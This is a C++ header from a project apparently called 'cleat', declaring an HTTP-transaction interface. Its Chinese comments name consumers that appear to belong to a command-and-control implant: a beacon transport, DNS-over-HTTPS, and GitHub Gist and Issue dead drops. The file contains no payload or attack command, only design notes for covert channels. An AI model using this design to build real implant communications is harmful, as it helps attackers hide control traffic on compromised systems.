// Core/Comms/Platform/IHttpOps.hpp
// HTTP 事务窄接口(Phase 1;  **归位 Platform 层**):
//   本件原置 Transports/Https/ —— 但消费方早已跨三个域: HttpsTransport(beacon)、
//   DnsTransport(DoH)、Exchange 死投递(Gist/GitHubIssue)与 AgentContext。
//   它语义上就是"HTTP 事务平台缝", 与 INetworkOps / IPipeOps 同列; 归位 Platform/
//   后各通道引用的是**平台层**而非"Https 通道的目录"(通道间零跨引用纪律, )。
// 平台 TLS 细节全部在 PlatformWin_Http / PlatformLinux_Http 内实现;
// 消费方只依赖本接口, 不感知 WinHTTP/libcurl。
// 一次调用 = 一个 HTTP 事务(内部 keep-alive 连接池由实现维护)。
#pragma once

#include <cstdint>
#include <memory>
#include <string>
#include <vector>

namespace cleat {

	enum class HttpMethod { Get, Post };

	class IHttpOps {
	public:
		virtual ~IHttpOps() = default;

		// 执行一次 HTTP 事务; 仅 HTTP 200 返回 true, response 为响应体
		// (空 body = 200 无数据, 同样返回 true)。超时由 timeout_ms 控制。
		// headers(N44 4.0.1, ): 附加请求头(缺省 nullptr = 既有调用点零改动)。
		// GitHub/Gitee 等 REST 平台强制 User-Agent; 同名头覆盖实现内建值。
		// 消费方: DeadDrop 平台适配器; 传输 beacon 路径不传(保持节拍一致性)。
		virtual bool RoundTrip(HttpMethod method, const std::string& url,
			const std::vector<uint8_t>& body, std::vector<uint8_t>& response,
			int timeout_ms,
			const std::vector<std::pair<std::string, std::string>>* headers = nullptr) = 0;

		// 清理连接池/句柄(断线/换通道时调用)
		virtual void Reset() = 0;
	};

	// 工厂(按平台条件编译, 遵守 CMake 平台过滤规则)
	std::unique_ptr<IHttpOps> CreateHttpOps();

} // namespace cleat
